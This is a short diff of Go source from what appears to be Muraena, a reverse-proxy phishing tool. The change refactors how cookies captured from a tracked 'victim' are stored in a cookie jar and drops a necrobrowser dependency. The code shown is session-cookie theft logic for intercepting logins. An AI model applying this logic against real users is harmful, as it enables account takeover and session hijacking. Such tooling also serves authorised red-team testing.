@@ -16,7 +16,6 @@ import (
 
 	"github.com/muraenateam/muraena/core"
 	"github.com/muraenateam/muraena/log"
-	"github.com/muraenateam/muraena/module/necrobrowser"
 	"github.com/muraenateam/muraena/module/statichttp"
 	"github.com/muraenateam/muraena/module/tracking"
 	"github.com/muraenateam/muraena/session"
@@ -280,23 +279,12 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 	victim := muraena.Tracker.TrackResponse(response)
 	if victim != nil {
 		// before transforming headers like cookies, store the cookies in the CookieJar
-		//log.Debug("Found %d cookies in the response", len(response.Cookies()))
 		for _, c := range response.Cookies() {
 			if c.Domain == "" {
-				//c.Domain = "." + sess.Config.Proxy.Target
 				c.Domain = response.Request.Host
 			}
 
-			sessCookie := necrobrowser.SessionCookie{
-				Name:     c.Name,
-				Value:    c.Value,
-				Domain:   c.Domain,
-				Expires:  "", // will be set by necrobrowser
-				Path:     c.Path,
-				HTTPOnly: c.HttpOnly,
-				Secure:   c.Secure,
-			}
-			muraena.Tracker.AddToCookieJar(victim, sessCookie)
+			muraena.Tracker.AddToCookieJar(victim, *c)
 		}
 	} else {
 
